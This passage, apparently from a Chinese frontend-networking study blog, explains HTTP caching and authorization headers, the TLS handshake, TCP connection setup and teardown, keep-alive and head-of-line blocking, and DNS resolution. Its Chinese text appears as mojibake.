è§„èŒƒï¼‰</li></ul></li></ul><p>ï¼ˆ2ï¼‰Cache-Control</p><ul><li>ä½œç”¨ï¼šæ§åˆ¶èµ„æºçš„ç¼“å­˜æœºåˆ¶ï¼ˆè¯·æ±‚&#x2F;å“åº”ä¸­å‡å¯ä½¿ç”¨ï¼‰ï¼Œä¼˜å…ˆçº§é«˜äº <code>Expires</code></li><li>å¸¸ç”¨æŒ‡ä»¤ï¼š</li></ul><table><thead><tr><th align="left">æŒ‡ä»¤</th><th align="left">è¯·æ±‚å¤´ç”¨é€”</th><th align="left">å“åº”å¤´ç”¨é€”</th></tr></thead><tbody><tr><td align="left">max-age&#x3D;3600</td><td align="left">-</td><td align="left">èµ„æºæœ‰æ•ˆæœŸï¼ˆç§’ï¼‰</td></tr><tr><td align="left">no-cache</td><td align="left">è¦æ±‚æœåŠ¡å™¨éªŒè¯ç¼“å­˜æœ‰æ•ˆæ€§</td><td align="left">å…è®¸ç¼“å­˜ä½†æ¯æ¬¡éœ€éªŒè¯</td></tr><tr><td align="left">no-store</td><td align="left">ç¦æ­¢ä»»ä½•ç¼“å­˜</td><td align="left">ç¦æ­¢ä»»ä½•ç¼“å­˜</td></tr><tr><td align="left">public</td><td align="left">-</td><td align="left">å…è®¸æ‰€æœ‰ç¯å¢ƒç¼“å­˜ï¼ˆCDN&#x2F;ä»£ç†ï¼‰</td></tr><tr><td align="left">private</td><td align="left">-</td><td align="left">ä»…å…è®¸æµè§ˆå™¨ç¼“å­˜</td></tr></tbody></table><ul><li>å‰ç«¯ä¼˜åŒ–å®è·µï¼š</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text"># é™æ€èµ„æºé•¿æœŸç¼“å­˜<br>Cache-Control: public, max-age=31536000, immutable<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰Authorization</p><ul><li>ä½œç”¨ï¼šåœ¨è¯·æ±‚å¤´ä¸­æºå¸¦å®¢æˆ·ç«¯èº«ä»½å‡­è¯ï¼Œç”¨äºè®¿é—®å—ä¿æŠ¤èµ„æº</li><li>å…¸å‹æ ¼å¼ï¼š<code>Authorization: &lt;è®¤è¯ç±»å‹&gt; &lt;å‡­è¯&gt;</code><ul><li>Bearer Tokenï¼ˆJWTæ ‡å‡†ï¼‰ï¼š<code>Authorization: Bearer eyJhbGci...</code></li><li>Basic Authï¼š<code>Authorization: Basic base64(username:password)</code></li></ul></li><li>å®‰å…¨è¦æ±‚ï¼š<ul><li>å¿…é¡»é€šè¿‡ HTTPS ä¼ è¾“ï¼ˆé˜²æ­¢å‡­è¯æ³„éœ²ï¼‰</li><li>å‰ç«¯å­˜å‚¨æ•æ„Ÿå‡­è¯éœ€ä½¿ç”¨ <code>HttpOnly Cookie</code> æˆ–å®‰å…¨å­˜å‚¨ï¼ˆSecure Storageï¼‰</li></ul></li></ul><h3 id="HTTPSåŠ å¯†åŸç†ï¼ˆSSL-TLSæ¡æ‰‹ã€è¯ä¹¦éªŒè¯ï¼‰"><a href="#HTTPSåŠ å¯†åŸç†ï¼ˆSSL-TLSæ¡æ‰‹ã€è¯ä¹¦éªŒè¯ï¼‰" class="headerlink" title="HTTPSåŠ å¯†åŸç†ï¼ˆSSL&#x2F;TLSæ¡æ‰‹ã€è¯ä¹¦éªŒè¯ï¼‰"></a>HTTPSåŠ å¯†åŸç†ï¼ˆSSL&#x2F;TLSæ¡æ‰‹ã€è¯ä¹¦éªŒè¯ï¼‰</h3><p><strong>æ ¸å¿ƒåŸç†</strong></p><p>æœ¬è´¨æ˜¯ HTTP + TLS&#x2F;SSL åŠ å¯†å±‚ï¼ˆä¼ è¾“å±‚å®‰å…¨åè®®ï¼‰ï¼Œé€šè¿‡æ··åˆåŠ å¯†ä½“ç³»ä¿éšœå®‰å…¨</p><p><strong>TLS&#x2F;SSL æ¡æ‰‹è¿‡ç¨‹</strong></p><table><thead><tr><th align="left">æ­¥éª¤</th><th align="left">å…³é”®åŠ¨ä½œ</th><th align="left">åŠ å¯†æŠ€æœ¯åº”ç”¨</th></tr></thead><tbody><tr><td align="left">ClientHello</td><td align="left">å®¢æˆ·ç«¯å‘é€ï¼šæ”¯æŒçš„ TLS ç‰ˆæœ¬ + åŠ å¯†å¥—ä»¶åˆ—è¡¨ + éšæœºæ•° A</td><td align="left">-</td></tr><tr><td align="left">ServerHello</td><td align="left">æœåŠ¡å™¨å“åº”ï¼šé€‰å®šçš„ TLS ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶ + éšæœºæ•° B + æ•°å­—è¯ä¹¦ï¼ˆå«å…¬é’¥ï¼‰</td><td align="left">éå¯¹ç§°åŠ å¯†åŸºç¡€</td></tr><tr><td align="left">è¯ä¹¦éªŒè¯</td><td align="left">å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦ï¼šé¢å‘æœºæ„ï¼ˆCAï¼‰å¯ä¿¡æ€§ + åŸŸååŒ¹é… + æœ‰æ•ˆæœŸ + è¯ä¹¦é“¾å®Œæ•´æ€§</td><td align="left">æ•°å­—ç­¾åæŠ€æœ¯</td></tr><tr><td align="left">äº¤æ¢å¯†é’¥</td><td align="left">å®¢æˆ·ç«¯ï¼šç”Ÿæˆé¢„ä¸»å¯†é’¥ï¼Œä½¿ç”¨å…¬é’¥åŠ å¯†é¢„ä¸»å¯†é’¥å¹¶å‘é€ç»™æœåŠ¡å™¨</td><td align="left">éå¯¹ç§°åŠ å¯†ï¼ˆRSA&#x2F;ECCï¼‰</td></tr><tr><td align="left">ç”Ÿæˆä¼šè¯å¯†é’¥</td><td align="left">åŒæ–¹ä½¿ç”¨éšæœºæ•° A&#x2F;B + é¢„ä¸»å¯†é’¥è®¡ç®—ä¼šè¯å¯†é’¥</td><td align="left">å¯†é’¥æ´¾ç”Ÿå‡½æ•°</td></tr><tr><td align="left">åŠ å¯†é€šä¿¡å°±ç»ª</td><td align="left">åŒæ–¹äº¤æ¢<code>Finished</code>æ¶ˆæ¯éªŒè¯å¯†é’¥æ­£ç¡®æ€§ï¼Œåç»­é€šä¿¡ä½¿ç”¨ä¼šè¯å¯†é’¥å¯¹ç§°åŠ å¯†</td><td align="left">å¯¹ç§°åŠ å¯†</td></tr></tbody></table><p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: ClientHello (TLSç‰ˆæœ¬ + åŠ å¯†å¥—ä»¶ + éšæœºæ•°A)    Server->>Client: ServerHello (åŠ å¯†å¥—ä»¶ + éšæœºæ•°B) + è¯ä¹¦    Note right of Client: è¯ä¹¦éªŒè¯ (CAé“¾/åŸŸå/æœ‰æ•ˆæœŸ)    Client->>Server: åŠ å¯†çš„é¢„ä¸»å¯†é’¥ (ç”¨æœåŠ¡å™¨å…¬é’¥)    Note left of Server: ç”Ÿæˆä¼šè¯å¯†é’¥ (éšæœºæ•°A+B+é¢„ä¸»å¯†é’¥)    Server->>Client: [Finished]    Client->>Server: [Finished]    Note over Client,Server: åç»­é€šä¿¡ä½¿ç”¨ä¼šè¯å¯†é’¥å¯¹ç§°åŠ å¯†</pre><p><strong>è¯ä¹¦éªŒè¯æœºåˆ¶</strong></p><table><thead><tr><th align="left">éªŒè¯ç¯èŠ‚</th><th align="left">æŠ€æœ¯åŸç†</th></tr></thead><tbody><tr><td align="left">è¯ä¹¦é“¾ä¿¡ä»»</td><td align="left">å®¢æˆ·ç«¯é¢„ç½®æ ¹ CA è¯ä¹¦ -&gt; éªŒè¯ä¸­é—´ CA ç­¾å -&gt; éªŒè¯æœåŠ¡å™¨è¯ä¹¦ç­¾å</td></tr><tr><td align="left">åŸŸåæ£€æŸ¥</td><td align="left">æ£€æŸ¥æœåŠ¡å™¨è¿”å›è¯ä¹¦é‡Œçš„ subject alternative nameï¼ˆSANï¼‰ æˆ– common nameï¼ˆCNï¼‰ æ˜¯å¦ä¸è®¿é—®åŸŸåä¸€è‡´</td></tr><tr><td align="left">åŠé”€æ£€æŸ¥</td><td align="left">é€šè¿‡ OCSP ï¼ˆåœ¨çº¿è¯ä¹¦çŠ¶æ€åè®®ï¼‰æˆ– CRL ï¼ˆè¯ä¹¦åŠé”€åˆ—è¡¨ï¼‰éªŒè¯è¯ä¹¦æœ‰æ•ˆæ€§</td></tr></tbody></table><p><strong>æ··åˆåŠ å¯†ä¼˜åŠ¿</strong></p><table><thead><tr><th align="left">é˜¶æ®µ</th><th align="left">æŠ€æœ¯</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td align="left">æ¡æ‰‹é˜¶æ®µ</td><td align="left">éå¯¹ç§°åŠ å¯†</td><td align="left">å®‰å…¨ä¼ è¾“ä¼šè¯å¯†é’¥ï¼ˆé˜²çªƒå¬ï¼‰</td></tr><tr><td align="left">æ•°æ®ä¼ è¾“é˜¶æ®µ</td><td align="left">å¯¹ç§°åŠ å¯†</td><td align="left">é«˜æ€§èƒ½åŠ å¯†ä¸šåŠ¡æ•°æ®ï¼ˆåƒå€äºéå¯¹ç§°ï¼‰</td></tr></tbody></table><p><strong>å‰ç«¯å…³é”®å½±å“</strong></p><ul><li>å®‰å…¨å®è·µï¼š<ul><li>å¿…é¡»ä½¿ç”¨ HTTPS è®¿é—®æ‰€æœ‰èµ„æºï¼ˆé¿å…æ··åˆå†…å®¹è­¦å‘Šï¼‰</li><li>ä½¿ç”¨ <code>Strict-Transport-Security</code> å¤´å¼ºåˆ¶ HTTPS</li></ul></li><li>æ€§èƒ½ä¼˜åŒ–ï¼š<ul><li>å¯ç”¨ TLS ä¼šè¯å¤ç”¨ï¼ˆsession resumptionï¼‰ï¼Œå‡å°‘æ¡æ‰‹å¼€é”€</li><li>ä½¿ç”¨ ECDHE å¯†é’¥äº¤æ¢ï¼ˆå‰å‘ä¿å¯†ï¼‰</li></ul></li></ul><h2 id="1-2-TCP-UDPåŸºç¡€"><a href="#1-2-TCP-UDPåŸºç¡€" class="headerlink" title="1.2 TCP&#x2F;UDPåŸºç¡€"></a>1.2 TCP&#x2F;UDPåŸºç¡€</h2><h3 id="ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹æµç¨‹"><a href="#ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹æµç¨‹" class="headerlink" title="ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹æµç¨‹"></a>ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹æµç¨‹</h3><p><strong>ä¸‰æ¬¡æ¡æ‰‹ï¼ˆè¿æ¥å»ºç«‹ï¼‰</strong></p><p>æµç¨‹å›¾è§£ï¼š</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: CLOSED â†’ SYN_SENT    Client->>Server: SYN=1, seq=x (éšæœºåºåˆ—å·)    Note right of Server: LISTEN â†’ SYN_RCVD    Server->>Client: SYN=1, ACK=1, seq=y, ack=x+1    Note left of Client: SYN_SENT â†’ ESTABLISHED    Client->>Server: ACK=1, seq=x+1, ack=y+1    Note right of Server: SYN_RCVD â†’ ESTABLISHED</pre><p>æ ¸å¿ƒæ­¥éª¤ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡æ¡æ‰‹<ul><li>å®¢æˆ·ç«¯å‘é€ SYN&#x3D;1ï¼ˆåŒæ­¥æ ‡å¿—ï¼‰å’Œéšæœºåºåˆ—å· seq&#x3D;x</li><li>çŠ¶æ€å˜åŒ–ï¼šå®¢æˆ·ç«¯è¿›å…¥ SYN_SENT</li></ul></li><li>ç¬¬äºŒæ¬¡æ¡æ‰‹<ul><li>æœåŠ¡å™¨è¿”å› SYN&#x3D;1 + ACK&#x3D;1ï¼ˆç¡®è®¤æ ‡å¿—ï¼‰ï¼Œæºå¸¦è‡ªå·±çš„åºåˆ—å· seq&#x3D;y å’Œç¡®è®¤å· ack&#x3D;x+1</li><li>çŠ¶æ€å˜åŒ–ï¼šæœåŠ¡å™¨è¿›å…¥ SYN_RCVD</li></ul></li><li>ç¬¬ä¸‰æ¬¡æ¡æ‰‹<ul><li>å®¢æˆ·ç«¯å‘é€ ACK&#x3D;1ï¼Œç¡®è®¤å· ack&#x3D;y+1</li><li>çŠ¶æ€å˜åŒ–ï¼šåŒæ–¹è¿›å…¥ ESTABLISHED</li></ul></li></ul><p>è®¾è®¡ç›®çš„ï¼š</p><ul><li>ç¡®è®¤åŒæ–¹çš„æ”¶å‘èƒ½åŠ›æ­£å¸¸</li><li>åŒæ­¥åˆå§‹åºåˆ—å·ï¼ˆé˜²å†å²é“¾æ¥æ··ä¹±ï¼‰</li></ul><p><strong>å››æ¬¡æŒ¥æ‰‹ï¼ˆè¿æ¥é‡Šæ”¾ï¼‰</strong></p><p>æµç¨‹å›¾è§£ï¼š</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Note left of Client: ESTABLISHED â†’ FIN_WAIT_1    Client->>Server: FIN=1, seq=u    Note right of Server: ESTABLISHED â†’ CLOSE_WAIT    Server->>Client: ACK=1, ack=u+1    Note left of Client: FIN_WAIT_1 â†’ FIN_WAIT_2    Server->>Client: FIN=1, seq=v, ack=u+1    Note right of Server: CLOSE_WAIT â†’ LAST_ACK    Client->>Server: ACK=1, ack=v+1    Note left of Client: FIN_WAIT_2 â†’ TIME_WAIT (2MSLåCLOSED)    Note right of Server: LAST_ACK â†’ CLOSED</pre><p>æ ¸å¿ƒæ­¥éª¤ï¼š</p><ul><li>ç¬¬ä¸€æ¬¡æŒ¥æ‰‹<ul><li>ä¸»åŠ¨æ–¹å‘é€ FIN&#x3D;1ï¼ˆç»“æŸæ ‡å¿—ï¼‰å’Œåºåˆ—å· seq&#x3D;u</li><li>çŠ¶æ€å˜åŒ–ï¼šä¸»åŠ¨æ–¹è¿›å…¥ FIN_WAIT_1</li></ul></li><li>ç¬¬äºŒæ¬¡æŒ¥æ‰‹<ul><li>è¢«åŠ¨æ–¹è¿”å› ACK&#x3D;1 å’Œç¡®è®¤å· ack&#x3D;u+1</li><li>çŠ¶æ€å˜åŒ–ï¼šè¢«åŠ¨æ–¹è¿›å…¥ CLOSE_WAITï¼ˆåŠå…³é—­çŠ¶æ€ï¼‰</li></ul></li><li>ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹<ul><li>è¢«åŠ¨æ–¹å‘é€è‡ªå·±çš„ FIN&#x3D;1 å’Œåºåˆ—å· seq&#x3D;v</li><li>çŠ¶æ€å˜åŒ–ï¼šè¢«åŠ¨æ–¹è¿›å…¥ LAST_ACK</li></ul></li><li>ç¬¬å››æ¬¡æŒ¥æ‰‹<ul><li>ä¸»åŠ¨æ–¹å‘é€ ACK&#x3D;1 å’Œç¡®è®¤å· ack&#x3D;v+1</li><li>çŠ¶æ€å˜åŒ–ï¼šä¸»åŠ¨æ–¹è¿›å…¥ TIME_WAITï¼ˆç­‰å¾…2MSLåå…³é—­ï¼‰</li></ul></li></ul><p>å…³é”®æœºåˆ¶ï¼š</p><ul><li>TIME_WAITçŠ¶æ€ï¼š<ul><li>æŒç»­2MSLï¼ˆæŠ¥æ–‡æœ€å¤§ç”Ÿå­˜æ—¶é—´ï¼Œé€šå¸¸1-4åˆ†é’Ÿï¼‰</li><li>ç›®çš„ï¼šç¡®ä¿æœ€åä¸€ä¸ª ACK åˆ°è¾¾ + è®©ç½‘ç»œä¸­æ®‹ç•™æŠ¥æ–‡å¤±æ•ˆ</li></ul></li><li>åŠå…³é—­çŠ¶æ€ï¼šè¢«åŠ¨æ–¹å¯åœ¨ CLOSE_WAIT é˜¶æ®µç»§ç»­å‘é€æ•°æ®</li></ul><p><strong>ä¸ HTTP åè®®çš„å…³ç³»</strong></p><ul><li>HTTP&#x2F;1.1ï¼šä¸‰æ¬¡æ¡æ‰‹åå®Œæˆå•ä¸ªè¯·æ±‚-å“åº”ï¼Œé»˜è®¤ Connection: keep-alive å¤ç”¨ TCP è¿æ¥</li><li>è¿æ¥å¼€é”€ï¼šé«˜é¢‘çŸ­è¿æ¥åœºæ™¯ï¼ˆå¦‚HTTP&#x2F;1.0ï¼‰ä¼šå› åå¤æ¡æ‰‹&#x2F;æŒ¥æ‰‹å¯¼è‡´æ€§èƒ½ä¸‹é™</li></ul><h3 id="è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰ä¸é˜Ÿå¤´é˜»å¡é—®é¢˜"><a href="#è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰ä¸é˜Ÿå¤´é˜»å¡é—®é¢˜" class="headerlink" title="è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰ä¸é˜Ÿå¤´é˜»å¡é—®é¢˜"></a>è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰ä¸é˜Ÿå¤´é˜»å¡é—®é¢˜</h3><p><strong>è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰</strong></p><p>å®šä¹‰ï¼šé€šè¿‡å¤ç”¨åŒä¸€ä¸ª TCP è¿æ¥å¤„ç†å¤šä¸ª HTTP è¯·æ±‚&#x2F;å“åº”ï¼Œé¿å…é‡å¤çš„ä¸‰æ¬¡æ¡æ‰‹å’Œå››æ¬¡æŒ¥æ‰‹ï¼Œé™ä½å»¶è¿Ÿå’Œèµ„æºæ¶ˆè€—ã€‚</p><p>å·¥ä½œåŸç†ï¼š</p><ul><li>HTTP&#x2F;1.1ï¼šé»˜è®¤å¯ç”¨Connection: keep-aliveï¼Œå…è®¸å¤ç”¨è¿æ¥ã€‚</li><li>HTTPå¤´éƒ¨æ§åˆ¶ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive  // å¯ç”¨å¤ç”¨<br><span class="hljs-attribute">Keep-Alive</span><span class="hljs-punctuation">: </span>timeout=5, max=100  // ç©ºé—²è¶…æ—¶5ç§’ï¼Œæœ€å¤šå¤ç”¨100æ¬¡è¯·æ±‚<br></code></pre></td></tr></table></figure><p>ä¼˜åŠ¿ï¼š</p><ul><li>å‡å°‘ TCP æ¡æ‰‹&#x2F;æŒ¥æ‰‹å¼€é”€ï¼ˆèŠ‚çœ1-2 RTT&#x2F;è¯·æ±‚ï¼‰</li><li>é™ä½æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯èµ„æºå ç”¨ï¼ˆå‡å°‘ Socket åˆ›å»ºå’Œé”€æ¯ï¼‰</li></ul><p>ç¤ºä¾‹æµç¨‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant Client    participant Server    Client->>Server: GET /page1 HTTP/1.1 (Connection: keep-alive)    Server->>Client: HTTP/1.1 200 OK (Connection: keep-alive)    Client->>Server: GET /page2 HTTP/1.1 (å¤ç”¨åŒä¸€TCPè¿æ¥)    Server->>Client: HTTP/1.1 200 OK</pre><p><strong>é˜Ÿå¤´é˜»å¡ï¼ˆHead-of-Line Blockingï¼‰</strong></p><p>å®šä¹‰ï¼šå½“å•ä¸ª TCP è¿æ¥ä¸­çš„å‰ä¸€ä¸ªè¯·æ±‚æœªå®Œæˆæ—¶ï¼Œåç»­è¯·æ±‚å¿…é¡»ç­‰å¾…ï¼Œå³ä½¿å®ƒä»¬å½¼æ­¤ç‹¬ç«‹ã€‚</p><p>ä¸¤ç§ç±»å‹ï¼š</p><ul><li>TCP å±‚é˜Ÿå¤´é˜»å¡<ul><li>åŸå› ï¼šTCP ä¿è¯æ•°æ®æœ‰åºäº¤ä»˜ï¼Œä¸¢å¤±åŒ…ä¼šé˜»å¡åç»­åŒ…çš„é‡ä¼ ã€‚</li><li>å½±å“ï¼šå³ä½¿HTTP&#x2F;2å¤ç”¨è¿æ¥ï¼Œä»å—åº•å±‚TCPé™åˆ¶ã€‚</li></ul></li><li>HTTP&#x2F;1.1å±‚é˜Ÿå¤´é˜»å¡<ul><li>åŸå› ï¼šHTTP&#x2F;1.1çš„ç®¡é“åŒ–ï¼ˆpipeliningï¼‰è¯·æ±‚å¿…é¡»æŒ‰é¡ºåºè¿”å›å“åº”ã€‚</li><li>ç¤ºä¾‹ï¼š</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">GET /resource1  // æ…¢è¯·æ±‚<br>GET /resource2  // è¢«é˜»å¡ç›´åˆ°resource1å®Œæˆ<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>HTTP&#x2F;2ï¼šå¼•å…¥å¤šè·¯å¤ç”¨ï¼ˆMultiplexingï¼‰ï¼Œé€šè¿‡äºŒè¿›åˆ¶åˆ†å¸§å±‚å®ç°å¹¶è¡Œè¯·æ±‚ã€‚</li><li>HTTP&#x2F;3ï¼šåŸºäºQUICåè®®ï¼ˆUDPï¼‰ï¼Œå½»åº•è§£å†³TCPå±‚é˜Ÿå¤´é˜»å¡ã€‚</li></ul><p><strong>å¯¹æ¯”æ€»ç»“</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¿æ¥å¤ç”¨ï¼ˆKeep-Aliveï¼‰</th><th align="left">é˜Ÿå¤´é˜»å¡é—®é¢˜</th></tr></thead><tbody><tr><td align="left">ä½œç”¨å±‚çº§</td><td align="left">HTTP&#x2F;1.1åŠä»¥ä¸Š</td><td align="left">TCPå±‚ + HTTP&#x2F;1.1ç®¡é“åŒ–</td></tr><tr><td align="left">ä¸»è¦ä¼˜åŒ–</td><td align="left">å‡å°‘æ¡æ‰‹å¼€é”€</td><td align="left">éœ€HTTP&#x2F;2æˆ–QUICè§£å†³</td></tr><tr><td align="left">æ€§èƒ½å½±å“</td><td align="left">æå‡çŸ­è¿æ¥åœºæ™¯æ€§èƒ½</td><td align="left">é«˜å»¶è¿Ÿç¯å¢ƒä¸‹æ€§èƒ½ä¸‹é™æ˜¾è‘—</td></tr></tbody></table><p><strong>å‰ç«¯ä¼˜åŒ–å®è·µ</strong></p><ol><li>HTTP&#x2F;1.1ä¼˜åŒ–ï¼šä½¿ç”¨å¤šä¸ªåŸŸåï¼ˆåˆ†ç‰‡ï¼‰ç»•è¿‡æµè§ˆå™¨å¯¹å•åŸŸåè¿æ¥æ•°çš„é™åˆ¶ï¼ˆé€šå¸¸6-8ä¸ªï¼‰</li><li>å‡çº§åè®®ï¼šä¼˜å…ˆä½¿ç”¨HTTP&#x2F;2ï¼ˆå¤šè·¯å¤ç”¨ï¼‰æˆ–HTTP&#x2F;3ï¼ˆQUICï¼‰ã€‚</li><li>èµ„æºåˆå¹¶ï¼šå‡å°‘è¯·æ±‚æ•°é‡ï¼ˆå¦‚CSS&#x2F;JSåˆå¹¶ï¼‰ï¼Œé™ä½é˜Ÿå¤´é˜»å¡å½±å“ã€‚</li></ol><h2 id="1-3-DNSè§£ææœºåˆ¶"><a href="#1-3-DNSè§£ææœºåˆ¶" class="headerlink" title="1.3 DNSè§£ææœºåˆ¶"></a>1.3 DNSè§£ææœºåˆ¶</h2><h3 id="åŸŸåè§£ææµç¨‹ï¼ˆé€’å½’æŸ¥è¯¢-æƒå¨è§£æï¼‰"><a href="#åŸŸåè§£ææµç¨‹ï¼ˆé€’å½’æŸ¥è¯¢-æƒå¨è§£æï¼‰" class="headerlink" title="åŸŸåè§£ææµç¨‹ï¼ˆé€’å½’æŸ¥è¯¢&#x2F;æƒå¨è§£æï¼‰"></a>åŸŸåè§£ææµç¨‹ï¼ˆé€’å½’æŸ¥è¯¢&#x2F;æƒå¨è§£æï¼‰</h3><p><strong>æ ¸å¿ƒæµç¨‹æ­¥éª¤</strong></p><pre class="mermaid">sequenceDiagram    participant User    participant LocalDNS as æœ¬åœ°DNS<br>(é€’å½’è§£æå™¨)    participant RootDNS as æ ¹DNS    participant TLDNS as é¡¶çº§åŸŸDNS<br>(å¦‚.com)    participant AuthDNS as æƒå¨DNS<br>(å¦‚example.com)        User->>LocalDNS: æŸ¥è¯¢ www.example.com    alt ç¼“å­˜å‘½ä¸­        LocalDNS-->>User: ç›´æ¥è¿”å›IP (ç¼“å­˜)    else é€’å½’æŸ¥è¯¢        LocalDNS->>RootDNS: è¯·æ±‚ .com çš„TLDåœ°å€        RootDNS-->>LocalDNS: è¿”å› .com TLDåœ°å€        LocalDNS->>TLDNS: è¯·æ±‚ example.com æƒå¨æœåŠ¡å™¨        TLDNS-->>LocalDNS: è¿”å› example.com NSè®°å½•        LocalDNS->>AuthDNS: è¯·æ±‚ www.example.com Aè®°å½•        AuthDNS-->>LocalDNS: è¿”å›IPåœ°å€        LocalDNS->>User: è¿”å›æœ€ç»ˆIP    end</pre><p><strong>é€’å½’æŸ¥è¯¢ï¼ˆRecursive Queryï¼‰</strong></p><ul><li>å‘èµ·è€…ï¼šå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨&#x2F;æ“ä½œç³»ç»Ÿï¼‰ â†’ æœ¬åœ° DNS æœåŠ¡å™¨</li><li>ç‰¹ç‚¹ï¼š<ul><li>å®¢æˆ·ç«¯åªå‘é€ä¸€æ¬¡è¯·æ±‚</li><li>æœ¬åœ° DNS è´Ÿè´£å®Œæ•´è§£ææµç¨‹ï¼Œæœ€ç»ˆè¿”å›IPæˆ–é”™è¯¯</li></ul></li><li>å®¢æˆ·ç«¯è¦æ±‚ï¼š<code>dig +recursive www.example.com</code></li></ul><p><strong>æƒå¨è§£æï¼ˆAuthoritative Resolutionï¼‰</strong></p><ul><li>æ‰§è¡Œè€…ï¼šæƒå¨ DNS æœåŠ¡å™¨ï¼ˆç®¡ç†ç‰¹å®šåŸŸåçš„ DNS è®°å½•ï¼‰</li><li>è®°å½•ç±»å‹ï¼š</li></ul><table><thead><tr><th align="left">è®°å½•</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">A</td><td align="left">IPv4åœ°å€</td><td align="left"><a href="http://www.example.com/">www.example.com</a>. 300 IN A 192.0.2.1</td></tr><tr><td align="left">AAAA</td><td align="left">IPv6åœ°å€</td><td align="left">â€¦ IN AAAA 2001:db8::1</td></tr><tr><td align="left">NS</td><td align="left">æŒ‡å®šåŸŸåçš„æƒå¨æœåŠ¡å™¨</td><td align="left">example.com. IN NS ns1.example.com</td></tr><tr><td align="left">CNAME</td><td align="left">åŸŸååˆ«å</td><td align="left">www IN CNAME example.com</td></tr></tbody></table><p><strong>è¿­ä»£æŸ¥è¯¢ï¼ˆIterative Query - å®é™…æ‰§è¡Œæ–¹å¼ï¼‰</strong></p><ul><li>å‘ç”Ÿä½ç½®ï¼šæœ¬åœ° DNS æœåŠ¡å™¨ â†’ æ ¹&#x2F;TLD&#x2F;æƒå¨DNS</li><li>æµç¨‹ç‰¹ç‚¹:<ol><li>æœ¬åœ° DNS æŸ¥è¯¢æ ¹ DNSï¼ˆå…¨çƒ13ç»„ï¼‰è·å– TLD åœ°å€</li><li>æŸ¥è¯¢TLD DNSï¼ˆå¦‚.comæ³¨å†Œå±€ï¼‰è·å–æƒå¨ DNS</li><li>æŸ¥è¯¢æƒå¨ DNS è·å–æœ€ç»ˆA&#x2F;AAAAè®°å½•</li></ol></li><li>å“åº”ç±»å‹ï¼š<ul><li>éæƒå¨åº”ç­”ï¼šè¿”å›ä¸‹çº§ DNS åœ°å€ï¼ˆè½¬å‘ï¼‰</li><li>æƒå¨åº”ç­”ï¼šç›´æ¥è¿”å› IPï¼ˆæœ€ç»ˆç»“æœï¼‰</li></ul></li></ul><p><strong>ç¼“å­˜æœºåˆ¶</strong></p><ul><li>æœ¬åœ°DNSç¼“å­˜ï¼š<ul><li>æ ¹æ® TTLï¼ˆTime-To-Liveï¼‰ç¼“å­˜è®°å½•ï¼ˆå¦‚300ç§’ï¼‰</li><li>å‡å°‘å…¨çƒ DNS æŸ¥è¯¢å‹åŠ›</li></ul></li><li>æµè§ˆå™¨&#x2F;OSç¼“å­˜ï¼š<ul><li>ipconfig &#x2F;displaydnsï¼ˆWindowsï¼‰æŸ¥çœ‹ç¼“å­˜</li><li>ç¼“å­˜è¿‡æœŸåé‡æ–°è§¦å‘é€’å½’æŸ¥è¯¢</li></ul></li></ul><p><strong>å‰ç«¯æ€§èƒ½å½±å“</strong></p><ul><li>ä¼˜åŒ–æ‰‹æ®µï¼š<ul><li>å‡å°‘åŸŸåæ•°é‡ï¼ˆé™ä½ DNS æŸ¥è¯¢æ¬¡æ•°ï¼‰</li><li>ä½¿ç”¨<code>&lt;link rel=&quot;dns-prefetch&quot;&gt;</code>é¢„è§£æå…³é”®åŸŸå</li></ul></li><li>å®‰å…¨æœºåˆ¶ï¼š<ul><li>DNSSECï¼šé˜²æ­¢ DNS æ¬ºéª—ï¼ˆæ•°å­—ç­¾åéªŒè¯ï¼‰</li><li>DoH&#x2F;DoTï¼šåŠ å¯† DNS æŸ¥è¯¢ï¼ˆé˜²æ­¢ç›‘å¬ï¼‰</li></ul></li></ul><h3 id="DNSé¢„å–ï¼ˆdns-prefetchï¼‰ä¸ç¼“å­˜ä¼˜åŒ–"><a href="#DNSé¢„å–ï¼ˆdns-prefetchï¼‰ä¸ç¼“å­˜ä¼˜åŒ–" class="headerlink" 